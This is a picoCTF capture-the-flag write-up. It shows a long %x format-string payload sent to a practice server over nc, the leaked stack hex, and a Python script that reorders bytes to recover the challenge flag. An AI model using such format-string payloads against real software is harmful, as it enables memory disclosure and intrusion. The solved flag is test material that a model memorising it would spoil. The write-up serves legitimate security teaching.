## Step 1
Execute `nc mercury.picoctf.net 33411`

## Step 2
Press 1 then when an api token is asked insert this string to take advantage of a format string vulnerability of the script:

```
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```

The output is:
```
83e4450804b00080489c3f7ed0d80ffffffff183e2160f7ede110f7ed0dc7083e3180183e443083e44506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ff82007df7f0baf8f7ede440e8b7a00010f7d6dce9f7edf0c0f7ed05c0f7ed0000ff8277f8f7d5e68df7ed05c08048ecaff8278040f7ef2f09804b000f7ed0000f7ed0e20ff827838f7ef8d50f7ed1890e8b7a000f7ed0000804b000ff8278388048c8683e2160ff827824ff8278388048be9f7ed03fc0ff8278ecff8278e41183e2160e8b7a000ff82785000f7d13fa1f7ed0000f7ed00000f7d13fa11ff8278e4ff8278ecff82787410f7ed0000f7ef370af7f0b0000f7ed0000004051d0cee6dfb6de000180486300f7ef8d50f7ef3960804b00018048630080486628048b851ff8278e48048cd08048d30f7ef3960ff8278dcf7f0b9401ff827e780ff827eb1ff827ebeff827ec7ff827ef6ff827f2eff827f49ff827f6bff827f73020f7ee3b5021f7ee3000101f8bfbff61000116438048034420597f7ee40008098048630b40ec40ed40fe40f17
```

## Step 3
Hence I couldn't find a way with python to ignore unconvertible characters (although I explored the `codecs.decode` path - let's say I didn't want to spend much time on it :) ), I used an online hex to text converter: e.g. https://www.duplichecker.com/hex-to-text.php.

This was the result:
```
��E���H�?~�������~�~��p����C>DPocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41���}������@跠������������������w��������H��'�@��/	�K�~��~���'��~��~щ�z�~������x8�H�h>!`��x$��x8�H��~�?���x���x����z��'��}�~��~�����?��'�O�'���'�A~��~�p�
```

Then I stripped up the unreadable part end the resulting string is (note the three --- to preserve the internal parts of the string):
```
ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41---}
```

## Step 4
Then I've used python to reorder the string correctly using this script:

```
result=[]
to_order="ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41---}"
for i in range(0, len(to_order), 4):
    result.append(to_order[i + 3] + to_order[i + 2] + to_order[i + 1] + to_order[i])

print(''.join(result))
```

And here's the flag:

```
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
```